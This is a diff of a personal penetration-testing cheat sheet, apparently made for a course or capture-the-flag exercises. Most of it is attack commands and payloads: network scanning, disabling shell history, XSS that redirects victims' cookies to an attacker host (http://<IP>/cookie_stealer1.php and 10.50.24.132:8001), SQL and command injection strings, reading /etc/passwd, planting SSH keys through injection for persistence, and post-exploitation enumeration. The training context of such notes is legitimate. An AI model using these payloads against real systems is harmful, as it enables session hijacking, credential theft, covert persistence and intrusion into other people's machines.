@@ -1,15 +1,22 @@
-///////////////////// Scans \\\\\\\\\\\\\\\\\
+/////////////// Scans \\\\\\\\\\\\\\\\\
 
-nmap <IP> --script smb-os-discovery		#enumerate smb
-nmap <IP> -sT -Pn -p 80 --script http-enum	#enumerate website
-nmap <IP> --script smb-os-discover -p 445
-nmap --script banner <IP> -p port
+nmap -Pn -sT <IP> -T4 -v
+  --script discovery 				#all enumeration options, or use scripts below
+    --script smb-os-discovery			#enumerate smb (can also append -p 445)
+    --script http-title
+    --script http-grep
+    --script http-enum				#enumerate website (append -p 80)
+    --script banner -p <port>
 
 proxychains nikto -host <IP>			#same as http-enum
 -or-
 nikto --host=http://10.50.20.170
 
 getend services <port>				#resolve a ports service through nsswitch.conf
+
+ssh user@ip -t /bin/bash < all24.sh 		#runs the non-interactive script remotely from target box (-t /bin/bash will try to force bash shell)
+
+ssh user@<ip> cat /etc/passwd			#run a single command remotely
 
 #Scan script for IPs
 for i in {1..254}; do nc -nzvw1 192.168.1.$i 20-23 80 2>&1 & done | grep -E 'succ|open$|OK$'
@@ -19,9 +26,6 @@ for i in {20..22000} ; do nc -nvzw1 <IP> $i 2>&1 & done | grep -E 'OK$|succ|open
 
 #scan with /dev/tcp
 for i in {20.22000} ; do if >/dev/tcp/<IP>/$i ; then echo Port $i & fi done
-
-ss -or- netstat (-tulpn)	#view listen connections
-ps aux | grep ssh		#view my backgrounded tunnels
 
 /////////////////// Linux Enumeration \\\\\\\\\\\\\\\\
 
@@ -40,24 +44,29 @@ echo “a bunch of text” | tr ‘ ‘ ‘\n’		#translate spaces to endlines 
 
 #Check CRONTAB
 --------------------------
-
 cat /etc/crontab				#look for something weird
 cd /etc/cron.d					#look for something weird
+
 uname -a 
 cat /etc/os-release
 cd /etc/rsyslog.d				#cat .conf to see where/what is being logged
-ip neighbor
-whoami -or- groups
-ip a -or- route -or- ip route -or- ip addr
-unset HISTFILE
+whoami -or- groups -or- id -or who -or- w
+ip neighbor -or- ip a -or- route -or- ip route -or- ip addr
+unset HISTFILE					#turn off bash command input logging
 set | grep HIST
 file *						#command to see what file is the windows exe
 
+ss -or- netstat (-tulpn)			#view listen connections
+ps aux | grep ssh				#view my backgrounded tunnels
+
+/////////Decode Base65 in CLI/////////
+echo asdfDEF== | base64 -d
+
 ///////////////////// Web Site scraping \\\\\\\\\\\\\\\\\
 
-(in the url) /robots.txt	#tells you what my be there
+(in the url) /robots.txt						#tells you what my be there
 
-wget -r <IP of website> 
+wget -r <IP of website>							#creates dir with IP scraped as name
 
 grep -Er '[0-9a-zA-Z]{20}' | grep -vE 'fonts|{*}|js|Binary|css'		#for CTFD only
 
@@ -66,22 +75,17 @@ grep -Er '[0-9a-zA-Z]{20}' | grep -vE 'fonts|{*}|js|Binary|css'		#for CTFD only
 1. post to the blog && check from another browser that the post saved on the server
 
 2. test for XSS ( all text blocks )
-	
 	<script> alert('hell0') </script>
 	<script> alert(/hell0/) </script>
 		 
 3. print out your own cookie
-	
 	<script> alert(document.cookie) </script>
-
 PHPSESSID=......
 
 4. upload this to the blog
-	
 	<script> document.location="http://<IP>/cookie_stealer1.php?username="+document.cookie; </script>
 
 5. create a cookiefile.txt on the victim or on your own webserver
-
 
 6. upload the cookie_stealer.php file to a file upload function or host the file on your own web server
 
@@ -96,7 +100,7 @@ fclose($steal);
 
 <script> document.location="http://10.50.24.132:8001? username="+document.cookie;</script>
 
-////////////////////// SQL Injection \\\\\\\\\\\\\\\\\\\\
+////////////////// SQL Injection \\\\\\\\\\\\\\\\\\\\
 
 #Log into SQL DB
 ----------------
@@ -107,23 +111,19 @@ CREDS IN DATABASE --> grep -r localhost OR grep -i pass *
 Once on box → look for a .php file with “//Set up DB connection”
 	→mysqli_connect(‘localhost:3306’,’username’,’password’,’database’)
 
-
-sql db commands
+#sql db commands
 ----------------
 show databases;
 show tables;
 use <database>;
 @@version
-
 ---------------
-practice test
 
+#Test SQL Susceptibility
+---------------
 url/pick.php?product=7 or 1=1 --> injectable
-
 url/pick.php? union select 1,2,3
-
 url/pick.php?product=7 union select table_schema, table_name, column_name from information_schema.columns	
-
 url/select username,user_id,name from siteusers.users
 ---------------
 
@@ -176,6 +176,8 @@ login.php?username=bob' or 1='1 & passwd=bob'or 1='1 !!!!!!
 
 ///////////// Command Injection \\\\\\\\\\\\\\\\
 
+system("ping -c 1 ".$_GET["ip"]);
+; cat /etc/passwd
 ; && || --> separate commands 
 
 ////////// Malicious File Upload \\\\\\\\\\\\\\
@@ -185,11 +187,11 @@ login.php?username=bob' or 1='1 & passwd=bob'or 1='1 !!!!!!
 
 ///////////////////// Plant SSH Keys \\\\\\\\\\\\\\\\\\\\
 
-1. ssh-keygen			#make id_rsa.pub on OPs box
+1. ssh-keygen					#make id_rsa.pub on OPs box
 
-2. using command injection	#make .ssh director and authorized keys file (on target box)
+2. <a true statment> ; mkdir /var/www/.ssh	#make .ssh director and authorized keys file (on target box)
 
-3. echo ' < id_rsa.pub > ' > ~/.ssh/id_rsa.pub 
+3. <a true statment> ; echo '< id_rsa.pub >' > ~/.ssh/id_rsa.pub 
 
 4. ssh to that box
 
@@ -204,12 +206,8 @@ url/image.php?file=../../etc/passwd
 	/etc/resolv.conf
 	/etc/nsswitch.conf
 
-////////////////////////////   Reverse Engineering   \\\\\\\\\\\\\\\\\\\\\\\\
-
-Static analysis
-
---use sha1sum to compare
---diff to compare
+hey ; whoami
+try || -or- &&
 
 /////////////Buffer Overflow (Custom Payloads)\\\\\\\\\\\\\
 
@@ -277,4 +275,18 @@ shutdown -r
 
 REGISTRY KEY for usernames/passwords
 hklm/software/microsoft/windows nt/currentversion/winlogon
+
+////// Post Exploitation (Actions on box)\\\\\\\\
+
+cat /etc/hosts					#looking for next box to scan
+cat /etc/passwd					#look for other users to su
+cat /etc/group | grep wheel 			#can sudo or switch users
+sudo -l						#see what commands you can sudo
+crontab -l					#see jobs running under your user
+cat /etc/cron 					#scheduled system jobs
+/var/spool/cron 				#scheduled user jobs
+find / -type f -perm /4000 2>dev/null 		#files with suid set
+find / type d -writable				#writable directories
+objdump -s -j .rodata /bin/netstat_natpu  	#check out suspicious binary
+
 
